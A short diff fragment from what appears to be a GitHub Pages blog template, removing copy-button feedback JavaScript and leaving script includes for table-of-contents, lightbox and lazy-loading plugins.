-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
